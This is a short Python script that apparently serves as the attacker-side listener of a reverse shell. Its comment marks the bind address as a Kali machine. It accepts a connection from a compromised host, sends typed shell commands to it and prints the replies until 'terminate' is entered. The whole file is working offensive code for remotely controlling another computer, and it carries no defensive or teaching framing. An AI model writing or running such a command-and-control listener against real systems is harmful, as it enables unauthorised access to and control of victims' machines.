# This Python file uses the following encoding: utf-8
from PySide2 import QtWidgets
import socket

def connect():
    s = socket.socket()
    s.bind(("192.168.0.152",8080)) #Adress IP Kali + port
    s.listen(1)
    conn, addr = s.accept()
    print ('[+] Connexion de : ' , addr)

    while True :
        command = input("Shell> ")
        if 'terminate' in command :
            conn.send('terminate'.encode())
            conn.close
            break
        else:
            conn.send(command.encode())
            print (conn.recv(1024).decode())

def main():
    connect()
main()
